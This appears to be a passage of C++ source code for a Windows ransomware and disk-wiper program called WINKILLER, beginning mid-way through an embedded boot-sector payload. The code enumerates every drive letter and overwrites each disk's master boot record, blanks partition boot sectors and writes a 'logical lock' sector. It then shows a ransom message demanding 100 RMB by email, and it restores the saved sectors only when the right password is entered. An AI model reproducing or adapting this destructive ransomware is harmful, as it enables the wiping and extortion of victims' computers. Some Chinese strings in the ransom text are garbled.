	0x65,0x72,0x20,0x68,0x61,0x73,0x20,0x62,0x65,0x65,0x6E,0x20,0x74,0x72,0x61,0x73,
	0x68,0x65,0x64,0x20,0x62,0x79,0x20,0x74,0x68,0x65,0x20,0x57,0x69,0x6E,0x4B,0x69,
	0x6C,0x6C,0x65,0x72,0x2E,0x2E,0x2E,0x20,0x4E,0x6F,0x77,0x20,0x65,0x6E,0x6A,0x6F,
	0x69,0x99,0x06,0x00,0xD2,0x04,0x86,0x20,0x43,0x61,0x74,0x2E,0x2E,0x2E,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
};

const BYTE EmptyPBR[512] = {
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
};

const BYTE LogicalLock[512] = {
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFE,
	0xFF,0xFF,0x07,0xFE,0xFF,0xFF,0xFF,0x03,0x00,0x00,0x00,0x58,0x15,0x00,0x00,0xFE,
	0xFF,0xFF,0x05,0xFE,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0xF0,0x25,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x55,0xAA,
	
};

const int DISK_PATH_LEN = 128;

struct MBR_BACKUP_INFO {
	char szPhysicalDrive[MAX_PATH];
	BYTE MBRBackup[4096];
};

struct PBR_BACKUP_INFO {
	char szPhysicalDrive[MAX_PATH];
	BYTE PBRBackup[512];
	LONGLONG PBRSector;
};

MBR_BACKUP_INFO MbrBackupData[256] = { 0 };
PBR_BACKUP_INFO PbrBackupData[1024] = { 0 };

int mbrbaks = 0, pbrbaks = 0, mbrused[256] = { 0 };

BOOL WriteSectors(
	char *szPhysicalDrive, 
	LONGLONG lSector, 
	LONGLONG nSectors, 
	const BYTE *Data, 
	PBR_BACKUP_INFO& pbd
)
{
	strcpy(pbd.szPhysicalDrive, szPhysicalDrive);
	DWORD dwReadSize;
	HANDLE hFile = CreateFile(szPhysicalDrive, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	if (!SetFilePointer(hFile, lSector * 512, NULL, FILE_CURRENT))
	{
		return FALSE;
	}
	pbd.PBRSector = lSector;
	if (ReadFile(hFile, (LPVOID)pbd.PBRBackup, nSectors * 512, &dwReadSize, NULL) == 0)
	{
		return FALSE;
	}
	if (CloseHandle(hFile) == FALSE)
	{
		return FALSE;
	}
	hFile = CreateFile(szPhysicalDrive, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	if (!SetFilePointer(hFile, lSector * 512, NULL, FILE_CURRENT))
	{
		return FALSE;
	}
	if (WriteFile(hFile, Data, nSectors * 512, &dwReadSize, NULL) == 0)
	{
		return FALSE;
	}
	if (CloseHandle(hFile) == FALSE)
	{
		return FALSE;
	}
	return TRUE;
}

BOOL RecoverySectors(
	PBR_BACKUP_INFO& pbd
)
{
	DWORD dwReadSize;
	HANDLE hFile = CreateFile(pbd.szPhysicalDrive, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	if (!SetFilePointer(hFile, pbd.PBRSector * 512, NULL, FILE_CURRENT))
	{
		return FALSE;
	}
	if (WriteFile(hFile, pbd.PBRBackup, 512, &dwReadSize, NULL) == 0)
	{
		return FALSE;
	}
	if (CloseHandle(hFile) == FALSE)
	{
		return FALSE;
	}
	return TRUE;
}

BOOL DestroyDiskMBR(
	MBR_BACKUP_INFO& mbd, 
	char				*szPhysicalDrive
)
{
	strcpy(mbd.szPhysicalDrive, szPhysicalDrive);
	DWORD dwReadSize;
	HANDLE hFile = CreateFile(szPhysicalDrive, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	if (ReadFile(hFile, (LPVOID)mbd.MBRBackup, 4096, &dwReadSize, NULL) == 0)
	{
		CloseHandle(hFile);
		return FALSE;
	}
	if (CloseHandle(hFile) == FALSE)
	{
		return FALSE;
	}
	hFile = CreateFile(szPhysicalDrive, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	if (WriteFile(hFile, WinKillerMBR, 4096, &dwReadSize, NULL) == 0)
	{
		CloseHandle(hFile);
		return FALSE;
	}
	if (CloseHandle(hFile) == FALSE)
	{
		return FALSE;
	}
	return TRUE;
}

BOOL DestroyPartition(
	char	*szPhysicalDrive, 
	char	szDriveLetter, 
	PBR_BACKUP_INFO& pbd
)
{
	char szDrive[MAX_PATH] = { 0 };
	sprintf(szDrive, "\\\\.\\%c:", szDriveLetter);
	HANDLE hFile = CreateFile(szDrive, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	DWORD dwOutByte;
	DISK_GEOMETRY diskGeometry;
	BOOL bDeviceRet = DeviceIoControl(hFile, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &diskGeometry, sizeof(DISK_GEOMETRY), &dwOutByte, NULL);
	if (bDeviceRet == FALSE)
	{
		return FALSE;
	}
	DWORD dwSectorByte = diskGeometry.BytesPerSector;
	PARTITION_INFORMATION partInfo;
	bDeviceRet = DeviceIoControl(hFile, IOCTL_DISK_GET_PARTITION_INFO, NULL, 0, &partInfo, sizeof(PARTITION_INFORMATION), &dwOutByte, NULL);
	if (bDeviceRet == FALSE)
	{
		return FALSE;
	}
	LONGLONG lPartitionSize = partInfo.PartitionLength.QuadPart;
	LONGLONG lOffset = partInfo.StartingOffset.QuadPart;
	LONGLONG lPartBegin = lOffset / dwSectorByte;
	if (CloseHandle(hFile) == FALSE)
	{
		return FALSE;
	}
	if (WriteSectors(szPhysicalDrive, lPartBegin, 1, EmptyPBR, pbd) == FALSE)
	{
		return FALSE;
	}
	return TRUE;
}

#ifdef _BOOT
BOOL DestroyBoot(
	char	*szPhysicalDrive, 
	PBR_BACKUP_INFO& pbd
)
{
	if (WriteSectors(szPhysicalDrive, 2048, 1, EmptyPBR, pbd) == FALSE)
	{
		return FALSE;
	}
	return TRUE;
}
#endif

BOOL SetLogicalLock(
	char	*szPhysicalDrive, 
	PBR_BACKUP_INFO& pbd
)
{
	if (WriteSectors(szPhysicalDrive, 1024, 1, LogicalLock, pbd) == FALSE)
	{
		return FALSE;
	}
	return TRUE;
}

BOOL RecoveryDiskMBR(
	MBR_BACKUP_INFO& mbd
)
{
	DWORD dwReadSize;
	HANDLE hFile = CreateFile(mbd.szPhysicalDrive, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	if (WriteFile(hFile, mbd.MBRBackup, 4096, &dwReadSize, NULL) == 0)
	{
		CloseHandle(hFile);
		return FALSE;
	}
	if (CloseHandle(hFile) == FALSE)
	{
		return FALSE;
	}
	return TRUE;
}

void cls()
{
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	COORD coordScreen = { 0, 0 };
    DWORD cCharsWritten;
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    DWORD dwConSize;
    GetConsoleScreenBufferInfo(hConsole, &csbi);
    dwConSize = csbi.dwSize.X * csbi.dwSize.Y;
    FillConsoleOutputCharacter(hConsole, (TCHAR) ' ', dwConSize, coordScreen, &cCharsWritten);
    GetConsoleScreenBufferInfo(hConsole, &csbi);
    FillConsoleOutputAttribute(hConsole, csbi.wAttributes, dwConSize, coordScreen, &cCharsWritten);
	SetConsoleCursorPosition(hConsole, coordScreen);
}

void _wk_fail(int errcode)
{
	cls();
	printf("[-] �ݻ�ʧ��!������:%d\n\n\n", errcode);
	getch();
	exit(errcode);
}

void GenKeyCode(string& code, string& key)
{
	code = key = "";
	string table = "0123456789ABCDEF";
	int len = table.length(), i;
	srand(time(NULL));
	for (i = 0; i < 1024; i++)
	{
		code += table[rand() % len];
	}
	for (i = 0; i < 1024; i++)
	{
		key += table[rand() % len];
	}
}

DWORD GetPhysicalDriveFromPartitionLetter(CHAR letter)
{
	HANDLE hDevice;               // handle to the drive to be examined
	BOOL result;                 // results flag
	DWORD readed;                   // discard results
	STORAGE_DEVICE_NUMBER number;   //use this to get disk numbers

	CHAR path[DISK_PATH_LEN];
	sprintf(path, "\\\\.\\%c:", letter);
	hDevice = CreateFileA(path, // drive to open
		GENERIC_READ | GENERIC_WRITE,    // access to the drive
		FILE_SHARE_READ | FILE_SHARE_WRITE,    //share mode
		NULL,             // default security attributes
		OPEN_EXISTING,    // disposition
		0,                // file attributes
		NULL);            // do not copy file attribute
	if (hDevice == INVALID_HANDLE_VALUE) // cannot open the drive
	{
		return -1;
	}

	result = DeviceIoControl(
		hDevice,                // handle to device
		IOCTL_STORAGE_GET_DEVICE_NUMBER, // dwIoControlCode
		NULL,                            // lpInBuffer
		0,                               // nInBufferSize
		&number,           // output buffer
		sizeof(number),         // size of output buffer
		&readed,       // number of bytes returned
		NULL      // OVERLAPPED structure
	);
	if (!result) // fail
	{
		CloseHandle(hDevice);
		return -1;
	}
	CloseHandle(hDevice);
	return number.DeviceNumber;
}

DWORD GetPartitionLetterFromPhysicalDrive(DWORD phyDriveNumber, CHAR **letters)
{
	DWORD letterNum;
	char disk_path[1024];
	PCHAR szDrive;
	memset(disk_path, 0, sizeof(disk_path));
	letterNum = 0;
	GetLogicalDriveStringsA(sizeof(disk_path), disk_path);
	szDrive = disk_path;
	while (*szDrive)
	{
		if (GetPhysicalDriveFromPartitionLetter(szDrive[0]) == phyDriveNumber)
		{
			letters[letterNum++] = szDrive;
		}
		szDrive += (strlen(szDrive) + 1);
	}
	return letterNum;
}

void DestroyAll()
{
	int i, phy;
	char phydrv[MAX_PATH];
	for (i = 'A'; i <= 'Z'; i++)
	{
		phy = GetPhysicalDriveFromPartitionLetter(i);
		if (phy != -1)
		{
			memset(phydrv, 0, sizeof(phydrv));
			sprintf(phydrv, "\\\\.\\PhysicalDrive%d", phy);
#ifdef _BOOT
			DestroyBoot(phydrv, PbrBackupData[pbrbaks++]);
#endif
			SetLogicalLock(phydrv, PbrBackupData[pbrbaks++]);
			DestroyPartition(phydrv, i, PbrBackupData[pbrbaks++]);
			if (mbrused[phy] != 1)
			{
				DestroyDiskMBR(MbrBackupData[mbrbaks++], phydrv);
				mbrused[phy] = 1;
			}
		}
	}
}

void RecoveryAll()
{
	int i;
	for (i = 0; i < mbrbaks; i++)
	{
		RecoveryDiskMBR(MbrBackupData[i]);
	}
	for (i = 0; i < pbrbaks; i++)
	{
		RecoverySectors(PbrBackupData[i]);
	}
}

void menu(string code, string psw)
{
	cls();
	printf("YOUR COMPUTER HAS BEEN DESTROYED BY ME!\n\n");
	printf("Do not attempt to shut down or restart your computer.\n");
	printf("Your data will be lost unless you pay a ransom.\n");
	printf("And you can't start PE because the hard disk already has a logical lock.\n");
	printf("I've put your code in the \"Code.Key\" file under this path.\n");
	printf("Ransom: 100RMB.Email:diskkiller@winkiller.cf.\n\n");
	printf("---------------------------------------\n\n");
	printf("��ĵ��Ա��һ���!\n\n");
	printf("��Ҫ��ͼ�رջ��������������.\n");
	printf("�����㸶���,����������ݻᶪʧ.\n");
	printf("���ѽ���Ĵ�������˴�·���µ�\"Code.Key\"�ļ���.\n");
	printf("�㲻������PE,��ΪӲ���Ѿ���һ���߼���.\n");
	printf("���:100�����.Email:diskkiller@winkiller.cf.\n");
	printf("Your code/��Ĵ���:\n");
	printf("************************\n");
	printf("%s\n", code.c_str());
	printf("************************\n\n");
	char inp[1024];
	while (psw != inp)
	{
		printf("Input your password/�����������:");
		scanf("%s", inp);
		printf("\n\n\n");
	}
	RecoveryAll();
	printf("������ȷ,���������������!�������������������!\n");
	printf("PASSWORD RIGHT,PRESS ANY KEY TO END THE PROGRAM!PLEASE RESTART YOUR COMPUTER TO FINISH CLEANING UP!\n\n");
	getch();
	exit(0);
}

int main(int argc, char* argv[])
{
	SetConsoleTitle("WINKILLER");
	DestroyAll();
	string c, k;
	GenKeyCode(c, k);
	ofstream code("Code.key");
	code << c;
	code.close();

#ifdef _KEY
	ofstream key("Key.key");
	key << k;
	key.close();
#endif

	menu(c, k);
	return 0;
}